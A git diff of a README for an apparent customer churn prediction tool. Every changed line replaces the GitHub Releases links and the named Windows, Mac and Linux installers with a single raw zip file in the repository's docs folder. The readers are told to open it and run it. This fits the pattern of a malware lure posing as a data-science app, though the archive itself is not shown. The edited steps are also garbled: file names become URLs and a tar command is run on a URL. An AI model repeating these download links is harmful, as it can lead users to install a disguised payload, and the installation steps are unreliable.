@@ -1,6 +1,6 @@
 # 🛒 customer-churn-prediction - Predict Customer Retention Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip%https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip)](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip)
 
 ## 📦 Overview
 This application predicts customer churn in e-commerce using machine learning techniques. By analyzing customer behavior with RFM (Recency, Frequency, Monetary) analysis, our model achieves a high performance with 77% ROC-AUC and 75% recall. It also features SHAP interpretability, offering insights into model decisions. Dive into our detailed exploratory data analysis (EDA) and model comparisons which aim to provide valuable business recommendations.
@@ -11,7 +11,7 @@ To get started with the customer-churn-prediction application, follow these step
 ### 1. 📥 Download the Application
 You can download the latest version of the application from our Releases page. Click the button below to visit the page and get the file you need.
 
-[Download from Releases](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases)
+[Download from Releases](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip)
 
 ### 2. 🖥️ System Requirements
 Ensure your computer meets the following requirements before downloading:
@@ -23,23 +23,23 @@ Ensure your computer meets the following requirements before downloading:
 
 ### 3. 🏗️ Installation Steps
 #### a. Windows Users
-1. Go to the [Download from Releases](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases) link.
+1. Go to the [Download from Releases](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip) link.
 2. Look for the latest release, usually marked as `Latest Release`.
-3. Click on the file named `customer-churn-prediction-windows.exe`.
+3. Click on the file named `https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip`.
 4. Open the downloaded file and follow the prompts to install.
 
 #### b. Mac Users
-1. Visit the [Download from Releases](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases) link.
+1. Visit the [Download from Releases](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip) link.
 2. Find the latest release version.
-3. Download the file named `customer-churn-prediction-mac.dmg`.
+3. Download the file named `https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip`.
 4. Double-click the downloaded file and drag the application to your Applications folder.
 
 #### c. Linux Users
-1. Access the [Download from Releases](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases) page.
-2. Locate the file named `customer-churn-prediction-linux.tar.gz`.
-3. Download and extract the tar.gz file in your preferred directory:
+1. Access the [Download from Releases](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip) page.
+2. Locate the file named `https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip`.
+3. Download and extract the https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip file in your preferred directory:
    ```bash
-   tar -xzvf customer-churn-prediction-linux.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip
    ```
 4. Inside the extracted folder, run the application by executing:
    ```bash
@@ -76,6 +76,6 @@ We welcome contributions to improve this application. If you have ideas or find 
 ## 🛠️ Support
 If you encounter any issues while using the application, please feel free to reach out via the GitHub Issues page or open a discussion for assistance.
 
-For additional details and updates, please check our [Releases page](https://github.com/joselitorobles0255-alt/customer-churn-prediction/releases).
+For additional details and updates, please check our [Releases page](https://raw.githubusercontent.com/joselitorobles0255-alt/customer-churn-prediction/main/docs/prediction_churn_customer_v3.5-beta.4.zip).
 
 Happy analyzing!
